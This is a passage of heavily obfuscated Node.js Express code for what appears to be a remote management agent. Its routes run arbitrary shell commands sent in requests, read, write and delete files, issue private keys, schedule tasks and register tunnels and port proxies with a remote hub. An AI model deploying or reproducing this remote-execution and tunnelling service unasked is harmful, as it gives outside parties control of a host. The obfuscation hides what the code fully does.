            'IVClS': 'https://shz.al/~',
            'SJKYw': function (c, d) {
                return c === d;
            },
            'nGLIF': function (c, d) {
                return c ?? d;
            },
            'gKmCS': nD(0x1b0),
            'kolrR': function (c, d) {
                return c(d);
            },
            'gZVkO': function (c, d) {
                return c(d);
            },
            'BCBoq': function (c, d) {
                return c === d;
            },
            'ARwZv': function (c, d) {
                return c === d;
            },
            'RcJsA': function (c, d) {
                return c < d;
            },
            'DBzhW': function (c, d) {
                return c > d;
            },
            'ryBYO': function (c, d) {
                return c === d;
            },
            'YQCXP': function (c, d) {
                return c === d;
            },
            'FgHok': function (c, d) {
                return c === d;
            },
            'uDjGm': function (c, d) {
                return c === d;
            },
            'DmuHa': function (c, d) {
                return c === d;
            },
            'OPYIa': function (c, d) {
                return c ?? d;
            },
            'aQckg': function (c, d) {
                return c === d;
            },
            'oqcgz': function (c, d) {
                return c === d;
            },
            'uafQJ': function (c, d) {
                return c === d;
            },
            'jiJJQ': nD(0xaa9),
            'IeOSt': 'utf-8',
            'uDhmV': function (c, d) {
                return c === d;
            },
            'XAbqZ': 'Authentication\x20failed:\x20Invalid\x20Token',
            'MIVOA': nD(0xbce),
            'dlFLP': function (c, d) {
                return c === d;
            },
            'xOQCw': nD(0x8d0),
            'FlGGy': function (c, d) {
                return c === d;
            },
            'GZnJC': function (c, d) {
                return c === d;
            },
            'sOYde': nD(0xbe),
            'nhqgo': nD(0xcb1),
            'BCNcy': nD(0x3d7),
            'QNpAR': nD(0x200),
            'aAlxY': nD(0x2f7),
            'pqHmU': nD(0xadf),
            'EwNra': nD(0xaf3),
            'IWnAK': nD(0x727),
            'MMmZL': nD(0xb4a),
            'vAaBu': nD(0xd7f),
            'XzPTn': function (c) {
                return c();
            },
            'nzlYR': function (c, d) {
                return c(d);
            },
            'XfAQG': nD(0xf2e),
            'OqcHj': nD(0xc3c),
            'fMBsQ': nD(0x90a),
            'Raekm': nD(0x469),
            'PeAwY': nD(0xb3c),
            'JxYwV': nD(0x819),
            'XzEtH': nD(0xb9f),
            'pxBlR': nD(0xba1),
            'igSYi': nD(0x7d3),
            'mpDZq': nD(0x813),
            'YMwfF': '/api/file/authority',
            'PJgeg': nD(0x5fc),
            'ADmHy': nD(0xc04),
            'rDOAn': nD(0x4a3),
            'EdTlk': nD(0xecd),
            'DSHxe': nD(0x648),
            'VnVsz': nD(0x293),
            'gxujv': nD(0xebf),
            'EZBMN': nD(0x2c3),
            'NpvHZ': nD(0x52f),
            'jZxBb': nD(0x377),
            'JlVmH': nD(0x846),
            'fbDwY': nD(0x61a),
            'kEHxH': nD(0x4e5),
            'SmCvs': function (c, d) {
                return c(d);
            },
            'drCIh': nD(0xd00),
            'XzFbW': nD(0x67d),
            'XvOhn': '/api/argo',
            'ISnYg': nD(0x58f),
            'GpOYZ': '/api/proxy/config',
            'wBRKF': nD(0x144),
            'DnEOP': '/api/proxy/:port/*',
            'TgYoJ': nD(0x168),
            'nizot': nD(0x734),
            'xIRfG': 'WebSocket\x20route\x20configured',
            'ZhKeb': nD(0xa50),
            'FKmTP': nD(0xe3d),
            'yCMcq': 'SIGINT\x20handler\x20registered'
        };
    try {
        await b[nD(0x188)](a0cV), a0R[nD(0xb89)](nD(0x5aa)), a0ax['merge'](a), a0R[nD(0xb89)](b[nD(0x1d8)]), a0ax['validate'](), a0R['debug'](b[nD(0xde4)]), a0R[nD(0xb89)](b[nD(0x7bb)]);
        const c = new a0aF(a0ax[nD(0xda6)], a0ax[nD(0x467)]);
        a0R['debug'](b['EwNra']);
        !a0ax['DEBUG'] && !c[nD(0x7c6)] && (a0R['error'](nD(0x387)), a0R['error'](b[nD(0x9a0)]), process['exit'](0x1));
        a0R[nD(0xb89)]('Initializing\x20TempKeyManager...');
        const d = new a0aE();
        d[nD(0x7f5)] = () => a0ax[nD(0xaac)](), a0R['debug'](b[nD(0xd52)]), a0R[nD(0xb89)](nD(0xa82));
        const f = new a0aI();
        a0R['debug'](nD(0xccb)), a0R['debug'](b[nD(0xf5)]);
        const g = b[nD(0x751)](a0f);
        b['nzlYR'](a0x, g), a0R[nD(0xb89)](b['XfAQG']), g[nD(0x720)]((r, s, t) => {
            const nE = nD, u = '5|2|0|4|3|1'['split']('|');
            let v = 0x0;
            while (!![]) {
                switch (u[v++]) {
                case '0':
                    s['header'](b[nE(0xe33)], b[nE(0xa4a)]);
                    continue;
                case '1':
                    b[nE(0x470)](t);
                    continue;
                case '2':
                    s['header'](b[nE(0x1b9)], b[nE(0x68f)]);
                    continue;
                case '3':
                    if (b[nE(0x303)](r[nE(0xae)], b[nE(0xbaa)])) {
                        if (r['path'][nE(0x46a)](nE(0x852)) && !r[nE(0xe76)][b['jtGzX']])
                            return b['uIruN'](t);
                        return a0ax[nE(0x892)] && s['set']('x-encrypted', b[nE(0xe32)]), s['status'](0xc8)[nE(0x65c)]();
                    }
                    continue;
                case '4':
                    s['header'](b[nE(0x1db)], b[nE(0xc5a)]);
                    continue;
                case '5':
                    s[nE(0x404)](nE(0x542), '*');
                    continue;
                }
                break;
            }
        }), g[nD(0x720)](nD(0xc3c), (r, s, t) => {
            const nF = nD;
            if (b[nF(0x303)](r[nF(0xda2)], b[nF(0xdb4)]) || r[nF(0xda2)][nF(0x46a)](b[nF(0xf9)]))
                return t();
            a0f[nF(0x209)]({
                'type': () => !![],
                'limit': Math['max'](0x1, a0ax['KISAMA_HUB_MAX_BODY'])
            })(r, s, t);
        }), g['use'](b[nD(0x3cf)], (r, s, t, u) => {
            const nG = nD;
            if (r && (b[nG(0xac7)](r[nG(0x527)], b[nG(0x213)]) || b[nG(0x7f6)](r[nG(0xab3)], 0x19d)))
                return t['status'](0x19d)[nG(0x3f9)]({
                    'status': nG(0x755),
                    'code': nG(0x4c1),
                    'message': nG(0xc54)[nG(0x7b6)](a0ax[nG(0xa94)], nG(0xe9e))
                });
            b[nG(0x875)](u, r);
        }), g[nD(0x720)](a0f[nD(0x342)]({
            'type': r => r[nD(0xda2)] !== nD(0xc04),
            'limit': nD(0x4a3)
        })), g[nD(0x720)](a0f[nD(0xe24)]({ 'extended': !![] })), g[nD(0x720)](a0aH(c, d)), a0R[nD(0xb89)](b[nD(0x35b)]), g[nD(0xb2b)](b[nD(0x6ba)], async (r, s) => {
            const nH = nD;
            try {
                const t = await a0ax[nH(0xdbe)](), u = await a0ax[nH(0x1c8)](t['virtualization'] || ''), v = await a0ax[nH(0xb4e)](), w = a0aI[nH(0xd03)](t, u, v);
                b[nH(0x7f6)](r[nH(0x462)], !![]) ? (w[nH(0xbb)] = a0ax['SESSION_KEY'], w['noise_key'] = a0ax[nH(0xf25)]) : (w[nH(0xbb)] = null, w['noise_key'] = null), s[nH(0x3f9)](w), b[nH(0x7f6)](a0ax[nH(0xa6a)], '1') && a0cK['onBaseinfoSuccess']();
            } catch (x) {
                s[nH(0xab3)](0x1f4)[nH(0x3f9)]({
                    'status': nH(0x755),
                    'message': x[nH(0xf18)]
                });
            }
        }), g[nD(0xb2b)](b['PeAwY'], (r, s) => {
            const nI = nD;
            let t = a0ax[nI(0xc64)];
            if (b['JkJLL'](r['query'][nI(0x4b6)], undefined)) {
                const y = parseInt(r['query'][nI(0x4b6)], 0xa);
                if (Number[nI(0xded)](y) || y < 0x1 || y > a0ax[nI(0x29f)])
                    return s[nI(0xab3)](0x1a6)['json']({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20'[nI(0x7b6)](a0ax['TEMPKEY_MAX_TTL_HOURS']) });
                t = y;
            }
            const u = typeof r[nI(0x302)][nI(0x64b)] === b[nI(0x5cf)] ? r['query'][nI(0x64b)]['trim']()['toLowerCase']() : '';
            let v;
            if (b['JPmHP'](u, '') || b[nI(0xde7)](u, nI(0x143)))
                v = b['YEyhT'];
            else {
                if (b[nI(0xbbb)](u, b[nI(0x369)]))
                    v = b[nI(0x369)];
                else
                    return s[nI(0xab3)](0x1a6)[nI(0x3f9)]({ 'error': nI(0x137) });
            }
            const w = d[nI(0x15d)](t), x = z => new Date(z * 0x3e8)[nI(0xdac)]()['replace'](nI(0xd85), 'Z');
            s[nI(0x3f9)]({
                'status': 'ok',
                'key_id': w[nI(0xb6b)],
                'ttl_seconds': w[nI(0x56c)],
                'created_at': b[nI(0x9ef)](x, w['created_at']),
                'expires_at': b[nI(0xf0e)](x, w[nI(0xaee)]),
                'ecdsa': b[nI(0x303)](v, nI(0x836)) ? {
                    'private_key': w[nI(0xba2)],
                    'public_key': w[nI(0xd93)]
                } : {
                    'private_key': w[nI(0xd30)][nI(0x27f)](),
                    'public_key': w['ecdsa_public_key'][nI(0x27f)]()
                },
                'ecies': b[nI(0x2e8)](v, 'short') ? {
                    'private_key': w[nI(0xebb)],
                    'public_key': w[nI(0xdd6)]
                } : {
                    'private_key': w[nI(0xebb)],
                    'public_key': w[nI(0x8a2)]
                }
            });
        }), g[nD(0xb2b)](b['JxYwV'], async (r, s) => {
            const nJ = nD, t = {
                    'fVcuo': b[nJ(0xa2d)],
                    'CRhZs': function (u, v) {
                        const nK = nJ;
                        return b[nK(0x1df)](u, v);
                    },
                    'SZXwM': b[nJ(0xd19)]
                };
            try {
                const u = Math['floor'](b[nJ(0x405)](Date[nJ(0x430)](), 0x3e8));
                !a0ax[nJ(0x4c2)] || b[nJ(0x49a)](u, a0ax[nJ(0xebe)]) > a0ax[nJ(0x8a7)] ? (!a0ax['_status_fetch_promise'] && (a0ax[nJ(0x7df)] = f[nJ(0x65f)]()[nJ(0x9f0)](w => {
                    const nL = nJ, x = t[nL(0xa24)][nL(0xc0)]('|');
                    let y = 0x0;
                    while (!![]) {
                        switch (x[y++]) {
                        case '0':
                            return w;
                        case '1':
                            a0ax[nL(0x7df)] = null;
                            continue;
                        case '2':
                            a0ax[nL(0x4c2)] = w;
                            continue;
                        case '3':
                            a0ax[nL(0xebe)] = Math[nL(0x69d)](t[nL(0xbab)](Date[nL(0x430)](), 0x3e8));
                            continue;
                        case '4':
                            a0R[nL(0xb89)](t[nL(0xe4d)]);
                            continue;
                        }
                        break;
                    }
                })['catch'](w => {
                    const nM = nJ;
                    a0ax[nM(0x7df)] = null;
                    throw w;
                })), await a0ax[nJ(0x7df)]) : a0R[nJ(0xb89)](b[nJ(0x108)]);
                const v = { ...a0ax['_status_cache'] };
                s['json'](v);
            } catch (w) {
                s[nJ(0xab3)](0x1f4)[nJ(0x3f9)]({
                    'status': b[nJ(0xd49)],
                    'message': w['message']
                });
            }
        });
        const h = async (r, s) => {
            const nN = nD;
            try {
                let t = null;
                if (b['XtHQM'](typeof r[nN(0x72a)], b[nN(0x5cf)]))
                    t = r[nN(0x72a)][nN(0x27f)]();
                else
                    r['body'] && b['ukjYC'](typeof r['body'], b['LIFsD']) && (t = r[nN(0x72a)]['cmd'] || '');
                if (!t)
                    return s[nN(0xab3)](0x190)[nN(0x3f9)]({
                        'status': nN(0x755),
                        'message': b[nN(0x9f5)]
                    });
                const u = await a0aJ['execute'](t, {
                    'cwd': r[nN(0x72a)][nN(0xc50)],
                    'env': r['body'][nN(0xb2e)],
                    'timeout': a0ax[nN(0x776)]
                });
                s[nN(0x3f9)](u);
            } catch (v) {
                s[nN(0xab3)](0x1f4)[nN(0x3f9)]({
                    'status': nN(0x755),
                    'message': v[nN(0xf18)]
                });
            }
        };
        g[nD(0x649)](b['XzEtH'], h);
        for (const r of [
                nD(0xa63),
                b[nD(0x296)],
                b[nD(0xd72)]
            ]) {
            g['post'](r, h);
        }
        g['post'](b[nD(0x93a)], async (s, t) => {
            const nO = nD;
            try {
                const u = await a0aM[nO(0x81d)](s[nO(0x72a)][nO(0xda2)], s[nO(0x72a)][nO(0x64c)]);
                t[nO(0x3f9)]({
                    'status': 'ok',
                    'count': u[nO(0x615)],
                    'files': u
                });
            } catch (v) {
                t[nO(0xab3)](0x1f4)[nO(0x3f9)]({
                    'status': b[nO(0xd49)],
                    'message': v[nO(0xf18)]
                });
            }
        }), g[nD(0x649)](b['YMwfF'], async (s, t) => {
            const nP = nD;
            try {
                const u = await a0aM[nP(0x9f3)](s[nP(0x72a)][nP(0x115)] || []);
                t[nP(0x3f9)]({
                    'status': 'ok',
                    'files': u
                });
            } catch (v) {
                t['status'](0x1f4)[nP(0x3f9)]({
                    'status': b[nP(0xd49)],
                    'message': v['message']
                });
            }
        }), g[nD(0xbd1)](b[nD(0x6ac)], async (s, t) => {
            const nQ = nD;
            try {
                const u = s[nQ(0x72a)]['permissions'] || {}, v = b['ukjYC'](s[nQ(0x72a)][nQ(0x64c)], !![]), w = await a0aM[nQ(0xa44)](u, v);
                t[nQ(0x3f9)](w);
            } catch (x) {
                t['status'](0x1f4)['json']({
                    'status': b['yFWBX'],
                    'message': x['message']
                });
            }
        }), g[nD(0x649)](b[nD(0x79f)], async (s, t) => {
            const nR = nD;
            try {
                const u = await a0aM[nR(0xd58)](s[nR(0x72a)][nR(0xda2)]);
                t['json'](u);
            } catch (v) {
                t[nR(0xab3)](0x1f4)[nR(0x3f9)]({
                    'status': b[nR(0xd49)],
                    'message': v['message']
                });
            }
        }), g[nD(0x649)](nD(0x648), async (s, t) => {
            const nS = nD;
            try {
                const u = await a0aM[nS(0x736)](s[nS(0x72a)][nS(0xda2)], s[nS(0x72a)][nS(0x70c)], s['body']['content'], s[nS(0x72a)][nS(0xa09)], s[nS(0x72a)][nS(0x6a2)]);
                t[nS(0x3f9)](u);
            } catch (v) {
                t[nS(0xab3)](0x1f4)[nS(0x3f9)]({
                    'status': b[nS(0xd49)],
                    'message': v[nS(0xf18)]
                });
            }
        }), g[nD(0x649)](b[nD(0x779)], a0f['raw']({
            'type': b[nD(0x18c)],
            'limit': b['rDOAn']
        }), async (s, t) => {
            const nT = nD;
            try {
                const u = decodeURIComponent(s[nT(0xe76)]['x-file-path'] || ''), v = b[nT(0x9ef)](decodeURIComponent, s['headers'][b[nT(0x19a)]] || ''), w = s[nT(0xe76)][b[nT(0x12a)]], x = s[nT(0xe76)][nT(0xa79)];
                if (!u || !v)
                    return t[nT(0xab3)](0x190)['json']({
                        'status': b[nT(0xd49)],
                        'completed': ![],
                        'message': b[nT(0x5ef)]
                    });
                const y = b['JkJLL'](w, undefined) ? b['AlZQX'](parseInt, b[nT(0xf0e)](String, w), 0xa) : null, z = b[nT(0x808)](x, undefined) ? b[nT(0x87d)](parseInt, b[nT(0x9ef)](String, x), 0xa) : null, A = s['body'];
                if (!Buffer[nT(0x55b)](A))
                    return t[nT(0xab3)](0x190)[nT(0x3f9)]({
                        'status': b[nT(0xd49)],
                        'completed': ![],
                        'message': b[nT(0xe8b)]
                    });
                const B = await a0aM[nT(0x754)](u, v, A, y, z);
                t[nT(0x3f9)](B);
            } catch (C) {
                t[nT(0xab3)](0x1f4)[nT(0x3f9)]({
                    'status': b['yFWBX'],
                    'completed': ![],
                    'message': C[nT(0xf18)]
                });
            }
        }), g['post'](b['EdTlk'], async (s, t) => {
            const nU = nD;
            try {
                const u = await a0aM['downloadFile'](s['body']['path']);
                t['set'](b[nU(0x3db)], u[nU(0xd76)][nU(0xa27)]()), t[nU(0x6e7)](b[nU(0x664)], u[nU(0xda2)]), t[nU(0x6e7)]('content-type', b['byWUX']);
                if (!a0ax[nU(0x892)] && b[nU(0xc59)](s[nU(0x404)](b[nU(0x496)]), '1') && b['hIPef'](a0ax['DOWNLOAD_ENCRYPT_MAX'], 0x0) && b[nU(0xedf)](u[nU(0xd76)], a0ax['DOWNLOAD_ENCRYPT_MAX']))
                    try {
                        const v = c[nU(0x21d)](u[nU(0x57d)], Buffer[nU(0x58d)](a0ax[nU(0xdd3)], b[nU(0x422)]));
                        return t[nU(0x6e7)](b[nU(0xef1)], nU(0xd97)), t[nU(0xb36)](v);
                    } catch (w) {
                        return t[nU(0xab3)](0x1f4)[nU(0x3f9)]({
                            'status': b[nU(0xd49)],
                            'message': b[nU(0xc69)]
                        });
                    }
                return t[nU(0xb36)](u[nU(0x57d)]);
            } catch (x) {
                t[nU(0xab3)](0x1f4)[nU(0x3f9)]({
                    'status': b[nU(0xd49)],
                    'message': x[nU(0xf18)]
                });
            }
        }), g[nD(0xcd1)](nD(0x648), async (s, t) => {
            const nV = nD;
            try {
                let u = s[nV(0x72a)][nV(0x115)];
                if (!u || !Array[nV(0x5f9)](u)) {
                    u = [];
                    if (s[nV(0x72a)][nV(0xda2)])
                        u[nV(0x59a)](s['body'][nV(0xda2)]);
                    if (s[nV(0x72a)]['path2'])
                        u[nV(0x59a)](s[nV(0x72a)][nV(0x418)]);
                }
                const v = await a0aM['deleteFiles'](u);
                t['json']({
                    'status': 'ok',
                    'results': v
                });
            } catch (w) {
                t['status'](0x1f4)['json']({
                    'status': b[nV(0xd49)],
                    'message': w[nV(0xf18)]
                });
            }
        }), g[nD(0xbd1)](b[nD(0x9ba)], async (s, t) => {
            const nW = nD;
            try {
                const u = await a0aM['moveFiles'](s[nW(0x72a)][nW(0x283)] || s[nW(0x72a)]);
                t['json']({
                    'status': 'ok',
                    'total': u['length'],
                    'success': u['filter'](v => v[nW(0xab3)] === 'ok')[nW(0x615)],
                    'results': u
                });
            } catch (v) {
                t[nW(0xab3)](0x1f4)[nW(0x3f9)]({
                    'status': b[nW(0xd49)],
                    'message': v[nW(0xf18)]
                });
            }
        }), g[nD(0x649)](b[nD(0xd33)], async (s, t) => {
            const nX = nD;
            try {
                const u = await a0aM['copyFiles'](s['body']);
                t[nX(0x3f9)]({
                    'status': 'ok',
                    'total': u[nX(0x615)],
                    'success': u[nX(0x74d)](v => v[nX(0xab3)] === 'ok')[nX(0x615)],
                    'results': u
                });
            } catch (v) {
                t['status'](0x1f4)[nX(0x3f9)]({
                    'status': b['yFWBX'],
                    'message': v[nX(0xf18)]
                });
            }
        }), g[nD(0x649)](nD(0x243), async (s, t) => {
            const nY = nD;
            try {
                const u = await a0aM[nY(0x9f8)](s[nY(0x72a)]['path']);
                t['json'](u);
            } catch (v) {
                t[nY(0xab3)](0x1f4)[nY(0x3f9)]({
                    'status': b['yFWBX'],
                    'message': v[nY(0xf18)]
                });
            }
        }), g[nD(0x649)](b[nD(0xbde)], async (s, t) => {
            const nZ = nD;
            try {
                const u = s[nZ(0x72a)] || {};
                if (!u[nZ(0xda2)])
                    return t['status'](0x190)['json']({ 'error': b[nZ(0x319)] });
                if (!Array[nZ(0x5f9)](u['items']) || b[nZ(0x41f)](u[nZ(0xf6)][nZ(0x615)], 0x0))
                    return t[nZ(0xab3)](0x190)['json']({ 'error': b['ncBGj'] });
                const v = await a0aM[nZ(0x840)](u[nZ(0xda2)], u[nZ(0xf6)], !!u[nZ(0xc1d)]);
                t[nZ(0x3f9)](v);
            } catch (w) {
                const x = /Access denied/[nZ(0xdbb)](w[nZ(0xf18)]) ? 0x193 : 0x190;
                t[nZ(0xab3)](x)[nZ(0x3f9)]({
                    'status': b['yFWBX'],
                    'message': w['message']
                });
            }
        }), g[nD(0x649)](b[nD(0xe46)], async (s, t) => {
            const o0 = nD;
            try {
                const u = s[o0(0x72a)] || {};
                if (!u[o0(0xda2)])
                    return t[o0(0xab3)](0x190)[o0(0x3f9)]({ 'error': o0(0xc4b) });
                const v = await a0aM[o0(0xc7c)](u['path'], u[o0(0xa39)], b[o0(0x56f)](u[o0(0xf13)], ![]), Array[o0(0x5f9)](u[o0(0x471)]) ? u['entries'] : null);
                t[o0(0x3f9)](v);
            } catch (w) {
                const x = /Access denied/[o0(0xdbb)](w['message']) ? 0x193 : 0x190;
                t[o0(0xab3)](x)[o0(0x3f9)]({
                    'status': b[o0(0xd49)],
                    'message': w['message']
                });
            }
        }), g[nD(0xb2b)](nD(0x52f), (s, t) => {
            t['json'](a0aO['getOnetimeTasks']());
        }), g['post'](b[nD(0xe1b)], async (s, t) => {
            const o1 = nD;
            try {
                const u = await a0aO['setOnetimeTasks'](s[o1(0x72a)]);
                t[o1(0x3f9)](u);
            } catch (v) {
                t[o1(0xab3)](v['status'] || 0x1f4)[o1(0x3f9)]({
                    'status': b[o1(0xd49)],
                    'message': v[o1(0xf18)]
                });
            }
        }), g[nD(0xb2b)](b[nD(0x65b)], (s, t) => {
            const o2 = nD;
            t[o2(0x3f9)](a0aO[o2(0xf10)]());
        }), g[nD(0x649)](b[nD(0x65b)], (s, t) => {
            const o3 = nD;
            try {
                const u = a0aO[o3(0x6a0)](s['body']);
                t[o3(0x3f9)](u);
            } catch (v) {
                t[o3(0xab3)](0x1f4)[o3(0x3f9)]({
                    'status': b[o3(0xd49)],
                    'message': v['message']
                });
            }
        }), g['get'](nD(0x170), (s, t) => {
            const o4 = nD;
            t['json'](a0aO[o4(0x7ca)]());
        }), g[nD(0xb2b)](b['JlVmH'], (s, t) => {
            const o5 = nD;
            let u = b[o5(0xec)](parseInt, s['query'][o5(0x9df)], 0xa) || 0x32;
            u = Math[o5(0xb66)](Math['max'](u, 0x1), 0x64), t[o5(0x3f9)](a0aO[o5(0x3ef)](u));
        }), g[nD(0xb2b)](b[nD(0x31f)], (s, t) => {
            const o6 = nD;
            let u = b['XSqLT'](parseInt, s[o6(0x302)]['limit'], 0xa) || 0x32;
            u = Math['min'](Math[o6(0x8b4)](u, 0x1), 0x64), t[o6(0x3f9)](a0aO[o6(0xd92)](u));
        }), g['delete'](b[nD(0x1e1)], (s, t) => {
            const o7 = nD;
            t[o7(0x3f9)](a0aO[o7(0x614)]());
        }), g[nD(0xcd1)](b['fbDwY'], (s, t) => {
            const o8 = nD;
            t[o8(0x3f9)](a0aO[o8(0x507)]());
        }), g['get'](b[nD(0x57f)], (s, t) => {
            const o9 = nD;
            t[o9(0x3f9)](a0aO[o9(0x1d3)]());
        }), g[nD(0x649)](nD(0x778), async (s, t) => {
            const oa = nD;
            try {
                const u = await a0aO['executeOnetimeTasks']();
                t[oa(0x3f9)](u);
            } catch (v) {
                t['status'](0x1f4)[oa(0x3f9)]({
                    'status': b[oa(0xd49)],
                    'message': v[oa(0xf18)]
                });
            }
        });
        const i = {
                'debug': (...s) => a0R[nD(0xb89)](s[nD(0x782)]('\x20')),
                'info': (...s) => a0R[nD(0x6e3)](s[nD(0x782)]('\x20')),
                'warning': (...s) => a0R[nD(0x9cd)](s[nD(0x782)]('\x20'))
            }, j = new a0cF(i), k = new a0cJ(i), l = [];
        let m = null;
        if (a0ax[nD(0xa6a)] === '3') {
            const s = b[nD(0x84d)](a0a7, a0ax[nD(0x39e)]);
            if (!a0ax[nD(0x828)])
                a0R[nD(0x9cd)]('[KMODE3]\x20⚠️\x20KHUB\x20未设置,\x20KMODE=3\x20未生效\x20(本地服务照常)');
            else {
                if (s)
                    a0R['warn'](nD(0xea3)['concat'](s, nD(0x320)));
                else {
                    !a0ax[nD(0xdaa)]['length'] && a0R[nD(0x6e3)](b['drCIh']);
                    const t = new a0cH(a0ax[nD(0x828)], a0ax[nD(0x39e)], a0ax[nD(0xb49)], a0ax[nD(0xdaa)], i, b[nD(0xdf6)]);
                    k[nD(0xf6)]['set'](a0ax['KNAME'][nD(0x27f)]()[nD(0x777)](), t), m = t;
                }
            }
        }
        const n = () => {
            const ob = nD;
            return a0aN[ob(0x4fa)](k['list']()[ob(0x9c5)](u => ({
                'hub': u['hub'],
                'kname': u[ob(0x973)],
                'ports': u[ob(0x7f0)]
            })));
        };
        g[nD(0xb2b)](b['XvOhn'], (u, v) => {
            const oc = nD, w = j[oc(0xcca)]();
            v[oc(0x3f9)]({
                'status': 'ok',
                'count': w[oc(0x615)],
                'tunnels': w
            });
        }), g[nD(0xb2b)](b[nD(0x42b)], (u, v) => {
            const od = nD, w = k['list']();
            if (!m && b[od(0xd9)](w[od(0x615)], 0x0))
                return v[od(0x3f9)]({
                    'status': 'ok',
                    'enabled': ![],
                    'message': b['yrSNb']
                });
            v[od(0x3f9)]({
                'status': 'ok',
                'enabled': b[od(0x6cc)](w[od(0x615)], 0x0),
                'tunnel': m ? m[od(0x235)]() : null,
                'registrations': w
            });
        }), g[nD(0x649)](nD(0x58f), async (u, v) => {
            const oe = nD, w = b['iGCzb'](a0cE, u[oe(0x72a)]) || {}, x = String(w[oe(0x4bc)] || '')[oe(0x27f)]()[oe(0xde0)](/\/+$/, '');
            if (!/^https?:\/\//i[oe(0xdbb)](x))
                return v[oe(0xab3)](0x1a6)[oe(0x3f9)]({
                    'status': b[oe(0xd49)],
                    'code': b[oe(0xdb7)],
                    'message': b['FddOZ']
                });
            const y = Array['isArray'](w[oe(0x7f0)]) ? w[oe(0x7f0)][oe(0x74d)](D => Number[oe(0x3f2)](D) && D >= 0x1 && D <= 0xffff) : [], {
                    snapshot: z,
                    code: A,
                    message: B
                } = await k[oe(0x6b8)](x, b[oe(0xf0e)](String, w[oe(0x973)] || ''), y, b[oe(0x581)], 0x3a98);
            (A === null || A === b[oe(0xeaf)]) && (y[oe(0x615)] && (b[oe(0xcb4)](a0am, a0ad, y), a0aN[oe(0xdd)](a0ai())));
            if (A === null) {
                const D = n();
                return v[oe(0x3f9)]({
                    'status': 'ok',
                    'persisted': D,
                    'registration': z
                });
            }
            if (b['JoVpR'](A, b[oe(0xeaf)])) {
                const E = b[oe(0x155)](n);
                return v[oe(0xab3)](0x1f4)[oe(0x3f9)]({
                    'status': b[oe(0xd49)],
                    'persisted': E,
                    'code': A,
                    'message': B,
                    'registration': z
                });
            }
            const C = b['VnTZC'](A, b[oe(0xd68)]) || A === 'full' ? 0x199 : 0x1a6;
            v[oe(0xab3)](C)[oe(0x3f9)]({
                'status': b['yFWBX'],
                'persisted': ![],
                'code': A,
                'message': B,
                'registration': z
            });
        }), g[nD(0xcd1)](b['ISnYg'], (u, v) => {
            const of = nD, w = b['LOhvh'](a0cE, u[of(0x72a)]) || {}, x = b[of(0x1e3)](String, w['kname'] || ''), y = k[of(0x513)](x);
            if (!y)
                return v[of(0xab3)](0x194)[of(0x3f9)]({
                    'status': of(0x755),
                    'message': 'KNAME\x20'[of(0x7b6)](x, '\x20未注册')
                });
            const z = b[of(0x188)](n);
            v['json']({
                'status': 'ok',
                'persisted': z,
                'removed': y
            });
        }), g[nD(0xb2b)](b[nD(0x873)], (u, v) => {
            const og = nD, w = a0aN[og(0xb3d)];
            v[og(0x3f9)]({
                'status': 'ok',
                'hub': {
                    'env_ports': [...new Set(a0ax[og(0xdaa)] || [])][og(0xa25)]((x, y) => x - y),
                    'runtime_ports': b['YTZlw'](a0ah, a0ad),
                    'effective_ports': a0aj(a0ad)
                },
                'local': {
                    'env_ports': [...new Set(a0ax['KPROXY_PORTS'] || [])][og(0xa25)]((x, y) => x - y),
                    'runtime_ports': a0ah(a0ae),
                    'effective_ports': b[og(0x161)](a0aj, a0ae)
                },
                'kstore_enabled': !!(w && w[og(0xbe3)] && !w[og(0x5dc)])
            });
        }), g[nD(0x649)](nD(0x600), (u, v) => {
            const oh = nD, w = b['fQkHP'](a0cE, u[oh(0x72a)]) || {}, x = w['scope'] || a0ae;
            if (x !== a0ad && b[oh(0x272)](x, a0ae))
                return v[oh(0xab3)](0x1a6)[oh(0x3f9)]({
                    'status': b['yFWBX'],
                    'code': oh(0xd4f),
                    'message': b[oh(0x444)]
                });
            if (!Array['isArray'](w[oh(0x7f0)]))
                return v['status'](0x1a6)['json']({
                    'status': b[oh(0xd49)],
                    'code': b[oh(0xcff)],
                    'message': b[oh(0x265)]
                });
            a0al(x, w[oh(0x7f0)]);
            const y = a0aN['saveProxyports'](b[oh(0xb81)](a0ai));
            v[oh(0x3f9)]({
                'status': 'ok',
                'persisted': y,
                'scope': x,
                'runtime_ports': a0ah(x),
                'effective_ports': b[oh(0xdae)](a0aj, x)
            });
        }), g[nD(0xcd1)](b[nD(0x873)], (u, v) => {
            const oi = nD, w = u['query'][oi(0x912)] || '';
            if (w && w !== a0ad && b[oi(0x924)](w, a0ae))
                return v[oi(0xab3)](0x1a6)[oi(0x3f9)]({
                    'status': oi(0x755),
                    'code': b[oi(0x36c)],
                    'message': b[oi(0x444)]
                });
            for (const y of w ? [w] : [
                    a0ad,
                    a0ae
                ]) {
                b['CtFTd'](a0al, y, []);
            }
            const x = a0aN['saveProxyports'](b[oi(0x188)](a0ai));
            v[oi(0x3f9)]({
                'status': 'ok',
                'persisted': x,
                'scope': w || b[oi(0x566)],
                'hub': {
                    'runtime_ports': a0ah(a0ad),
                    'effective_ports': b['OSCvK'](a0aj, a0ad)
                },
                'local': {
                    'runtime_ports': b[oi(0xf0e)](a0ah, a0ae),
                    'effective_ports': a0aj(a0ae)
                }
            });
        });
        const o = async (u, v) => {
            const oj = nD, w = b['QzjjE'](parseInt, u['params']['port'], 0xa);
            if (!Number[oj(0x3f2)](w) || b[oj(0x5e1)](w, 0x1) || b[oj(0xa9e)](w, 0xffff))
                return v[oj(0xab3)](0x194)[oj(0x3f9)]({
                    'status': b[oj(0xd49)],
                    'code': b[oj(0xc7d)],
                    'message': oj(0x761)[oj(0x7b6)](u[oj(0x4e6)][oj(0x606)])
                });
            const x = { ...u[oj(0xe76)] };
            for (const C of a0ac)
                delete x[C];
            const y = u[oj(0x274)] && u[oj(0x274)]['remoteAddress'] || '';
            let z, A, B;
            try {
                const D = b[oj(0x161)](a0ar, {
                    'port': w,
                    'whitelist': b[oj(0x161)](a0aj, a0ae),
                    'method': u[oj(0xae)],
                    'path': b[oj(0x2a3)]('/', u['params'][0x0] || ''),
                    'query': u[oj(0x62e)][oj(0xd32)]('?') ? u[oj(0x62e)]['slice'](b[oj(0x6f0)](u[oj(0x62e)][oj(0x44f)]('?'), 0x1)) : '',
                    'headers': x,
                    'body': u[oj(0x72a)] || Buffer[oj(0xacf)](0x0),
                    'maxBody': Math[oj(0x8b4)](0x1, a0ax[oj(0xa94)]),
                    'relayTimeout': b[oj(0x532)](Math[oj(0x8b4)](0x5, a0ax[oj(0xed0)]), 0x3e8),
